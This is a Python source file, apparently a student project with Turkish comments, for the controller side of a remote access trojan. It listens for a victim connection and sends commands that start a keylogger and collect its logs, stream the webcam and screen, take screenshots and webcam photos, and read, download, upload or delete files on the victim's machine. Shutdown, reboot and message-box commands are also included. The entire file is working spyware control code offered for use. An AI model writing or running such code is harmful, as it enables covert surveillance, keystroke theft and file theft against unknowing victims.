# CREATED BY ATA GÜRSEL
# 215060044

import random  # random modülünü dahil et, rastgele sayılar kullanabilmek için
import socket, os  # socket ve os modüllerini dahil et, ağ bağlantısı ve işletim sistemi işlemleri için

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
    
    def build_connection(self):
        global client, addr, s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # AF_INET: IPv4, SOCK_STREAM: TCP kullanarak bir soket oluştur
        s.bind((self.host, self.port))  # belirtilen IP ve port üzerinden soketi bağla
        s.listen(5)  # 5 bağlantıyı dinleme kuyruğuna al
        print("[*] Waiting for the client...")
        client, addr = s.accept()  # bağlantıyı kabul et ve istemci bilgilerini al
        print()
        ipcli = client.recv(1024).decode()  # istemciden gelen IP adresini al
        print(f"[*] Connection is established successfully with {ipcli}")
        print()
    
    def server(self):
        try:
            from vidstream import StreamingServer  # vidstream modülünü içe aktar, video yayını için
            global server
            server = StreamingServer(self.host, 8080)  # video yayını sunucu nesnesini oluştur
            server.start_server()  # video yayını sunucuyu başlat
        except:
            print("Module not found...")  # modül bulunamazsa hata mesajı yazdır
    
    def stop_server(self):
        server.stop_server()  # video yayını sunucuyu durdur
    
    def result(self):
        client.send(command.encode())  # komutu istemciye gönder
        result_output = client.recv(1024).decode()  # istemciden gelen sonuçları al
        print(result_output)  # sonuçları ekrana yazdır
    
    def banner(self):
        # Komut menülerini yazdır
        print("                 CREATED BY ATA GÜRSEL             ")
        print("======================================================") 
        print("                       Commands                       ")
        print("======================================================")
        print("System: ")
        print("======================================================")
        print(f'''
browser                           Enter query to browser
reboot                            Reboot the system
sendmessage                       Send messagebox with the text
shutdown                          Shutdown client's PC
turnoffmon                        Turn off the monitor
turnonmon                         Turn on the monitor
volumedown                        Decrease system volume to 0%
volumeup                          Increase system volume to 100%
writein <text>                    Write the text to the current opened window
exit                              Terminate the session of RAT
''')
        print("======================================================")
        print("Input devices: ")
        print("======================================================")
        print(f'''    
start_keylogger                   Start keylogger
send_logs                         Send captured keystrokes
stop_keylogger                    Stop keylogger
''')
        print("======================================================")
        print("Video: ")
        print("======================================================")
        print(f'''  
breakstream                       Break webcam/screenshare stream
screenshare                       Overseeing remote PC
screenshot                        Capture screenshot
webcam                            Webcam video capture
webcam_snap                       Capture webcam photo
''')
        print("======================================================")
        print("Files:")
        print("======================================================")
        print(f'''
cp <file1> <file2>                Copy file
createfile <file>                 Create file
delfile <file>                    Delete file
download <file> <homedir>         Download file
editfile <file> <text>            Edit file
mkdir <dirname>                   Make directory
mv <file> <path>                  Move file
readfile <file>                   Read from file
rmdir <dirname>                   Remove directory
searchfile <file> <dir>           Search for file in mentioned directory
startfile <file>                  Start file
upload                            Upload file
''')
        print("======================================================")
    
    def execute(self):
        self.banner()  # komut menülerini göster
        while True:
            global command
            command = input('Command >>  ')  # kullanıcıdan komut girişi al

            # Bilgisayarı kapatma işlemini gerçekleştirir.
            if command == 'shutdown':
                self.result()

            # Bilgisayarı yeniden başlatma işlemini gerçekleştirir.
            elif command == 'reboot':
                self.result()

            # Bilgisayarın ses seviyesini artırma işlemini gerçekleştirir.
            elif command == 'volumeup':
                self.result()

            # Bilgisayarın ses seviyesini azaltma işlemini gerçekleştirir.
            elif command == 'volumedown':
                self.result()

            # Bilgisayar ekranını kapatma işlemini gerçekleştirir.
            elif command == 'turnoffmon':
                self.result()

            # Bilgisayar ekranını açma işlemini gerçekleştirir.
            elif command == 'turnonmon':
                self.result()

            # Keylogger'ı başlatma işlemini gerçekleştirir.
            elif command == 'start_keylogger':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)

            # Keylogger'ın kayıtlarını sunucuya gönderme işlemini gerçekleştirir.
            elif command == 'send_logs':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)

            # Keylogger'ı sonlandırma işlemini gerçekleştirir.
            elif command == 'stop_keylogger':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
                
            # Belirtilen dosyayı silme işlemini gerçekleştirir.
            elif command[:7] == 'delfile':
                if not command[8:]:
                    print("No file to delete")
                else:
                    self.result()

            # Belirtilen dosyayı oluşturma işlemini gerçekleştirir.
            elif command[:10] == 'createfile':
                if not command[11:]:
                    print("No file to create")
                else:
                    self.result()

            # Belirtilen dosyaya metin yazma işlemini gerçekleştirir.
            elif command[:7] == 'writein':
                if not command[8:]:
                    print("No text to output")
                else:
                    self.result()

            # Mesaj Gönderme İşlemi.
            elif command == 'sendmessage':
                 # Kullanıcıdan metin ve başlık alır.
                client.send(command.encode())
                text = str(input("Enter the text: "))
                client.send(text.encode())
                title = str(input("Enter the title: "))
                client.send(title.encode())
                 # Sunucudan gelen cevabı alır ve yazdırır
                result_output = client.recv(1024).decode()
                print(result_output)

            # Dosya Okuma İşlemi.
            elif command[:8] == 'readfile':
                 # Dosya adı belirtilmemişse hata mesajı yazdırır.
                if not command[9:]:
                    print("No file to read")
                else:
                      # Dosya adını sunucuya gönderir
                    client.send(command.encode())
                     # Sunucudan gelen cevabı alır ve yazdırır
                    result_output = client.recv(2147483647).decode()
                    print("===================================================")
                    print(result_output)
                    print("===================================================")

            # Web Tarayıcısı Kullanımı.
            elif command[:7] == 'browser':
               # Kullanıcıdan bir sorgu alır
                client.send(command.encode())
                quiery = str(input("Enter the quiery: "))
                client.send(quiery.encode())
                 # Sunucudan gelen cevabı alır ve yazdırır
                result_output = client.recv(1024).decode()
                print(result_output)

            # Kopyalama işlemleri.
            elif command[:2] == 'cp':
                self.result()
            #Taşıma işlemleri.
            elif command[:2] == 'mv':
                self.result()
            # Dosya Düzenleme İşlemi.
            elif command[:8] == 'editfile':
                self.result()
            # Yeni Klasör Oluşturma İşlemi.
            elif command[:5] == 'mkdir':
                if not command[6:]:
                 # Klasör adı belirtilmemişse hata mesajı yazdırır.
                    print("No directory name")
                else:
                    self.result()

            # Klasör Silme İşlemi.
            elif command[:5] == 'rmdir':
                if not command[6:]:
              # Klasör adı belirtilmemişse hata mesajı yazdırır.
                    print("No directory name")
                else:
                    self.result()

            # Dosya Araştırma İşlemi.
            elif command[:10] == 'searchfile':
                self.result()
            
            # Ekran Paylaşımı İşlemi.
            elif command == 'screenshare':
                client.send(command.encode("utf-8"))
                self.server()

            # Webcam Kullanımı İşlemi.
            elif command == 'webcam':
                client.send(command.encode("utf-8"))
                self.server()

            # Akışı Durdurma İşlemi.
            elif command == 'breakstream':
                self.stop_server()

            # Dosya Başlatma İşlemi.
            elif command[:9] == 'startfile':
                if not command[10:]:
                    print("No file to launch")
                else:
                    self.result()

              # Dosya İndirme İşlemi.
            elif command[:8] == 'download':
                try:
                   # Dosya adı belirtilmemişse hata mesajı yazdırır.
                    client.send(command.encode())
                  # Sunucudan gelen dosyayı belirtilen ad ile kaydeder.
                    file = client.recv(2147483647)
                    with open(f'{command.split(" ")[2]}', 'wb') as f:
                        f.write(file)
                        f.close()
                    print("File is downloaded")
                except: 
                    print("Not enough arguments")

              # Dosya Yükleme İşlemi.
            elif command == 'upload':
              # Kullanıcıdan dosya yolu ve hedef dosya adını alır.
                client.send(command.encode())
                file = str(input("Enter the filepath to the file: "))
                filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
              # Dosyayı okur ve sunucuya gönderir
                data = open(file, 'rb')
                filedata = data.read(2147483647)
                client.send(filename.encode())
                print("File has been sent")
                client.send(filedata)

            # Ekran Görüntüsü Alma İşlemi.
            elif command == 'screenshot':
                    # Sunucuya 'screenshot' komutunu gönderir.
                client.send(command.encode())
              # Sunucudan alınan dosyayı belirtilen isimle kaydeder
                file = client.recv(2147483647)
                path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
                with open(path, 'wb') as f:
                    f.write(file)
                    f.close()
               # Dosyanın tam yolunu alır ve kullanıcıya gösterir.
                path1 = os.path.abspath(path)
                print(f"File is stored at {path1}")

            # Webcam Görüntüsü Alma İşlemi.
            elif command == 'webcam_snap':
                    # Sunucuya 'webcam_snap' komutunu gönderir.
                client.send(command.encode())
                    # Sunucudan alınan dosyayı belirtilen isimle kaydeder.
                file = client.recv(2147483647)
                with open(f'{os.getcwd()}\\{random.randint(11111,99999)}.png', 'wb') as f:
                    f.write(file)
                    f.close()
                print("File is downloaded")

               # Çıkış İşlemi.
            elif command == 'exit':
             # Sunucuya 'exit' komutunu gönderir.
                client.send(command.encode())
             # Sunucudan gelen çıkış mesajını alır ve ekrana yazdırır.
                output = client.recv(1024)
                output = output.decode()
                print(output)
            # Soket bağlantılarını kapatır.
                s.close()
                client.close()

# Sunucu nesnesini oluştur
rat = RAT_SERVER('127.0.0.1', 5555)

# Ana program
if __name__ == '__main__':
    rat.build_connection()  # bağlantıyı kur
    rat.execute()  # ana döngüyü çalıştır